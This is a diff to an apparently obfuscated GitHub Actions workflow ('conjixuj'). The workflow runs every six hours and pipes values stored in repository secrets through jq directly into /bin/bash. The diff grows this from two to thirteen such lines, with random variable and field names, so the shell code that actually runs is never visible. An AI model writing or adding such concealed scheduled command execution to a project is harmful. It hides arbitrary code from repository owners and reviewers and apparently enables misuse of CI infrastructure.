@@ -3,8 +3,7 @@ name: conjixuj
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 3/6 * * *'
-
+    - cron: '42 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,8 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: conjixuj
         env:
-          goqs55: ${{ secrets.goqs55 }}
+          e1408: ${{ secrets.e1408 }}
         run: |
-          echo $goqs55 | jq -r .l67 | /bin/bash
-          echo $qgoeg44 | jq -r .tg94 | /bin/bash
+          echo $e1408 | jq -r .ieexu31573 | /bin/bash
+          echo $tjffb7982 | jq -r .rfg87693 | /bin/bash
+          echo $z3 | jq -r .wkzca192 | /bin/bash
+          echo $vmxo06369 | jq -r .qnox35 | /bin/bash
+          echo $s3 | jq -r .uro0111 | /bin/bash
+          echo $trrfh42092 | jq -r .k855 | /bin/bash
+          echo $d49466 | jq -r .l6 | /bin/bash
+          echo $fo624 | jq -r .g4597 | /bin/bash
+          echo $aex37 | jq -r .gd78 | /bin/bash
+          echo $ogy2 | jq -r .qvw54 | /bin/bash
+          echo $of41045 | jq -r .zyik5841 | /bin/bash
+          echo $y63667 | jq -r .oll3 | /bin/bash
+          echo $prnln9214 | jq -r .wjzrr8 | /bin/bash
 
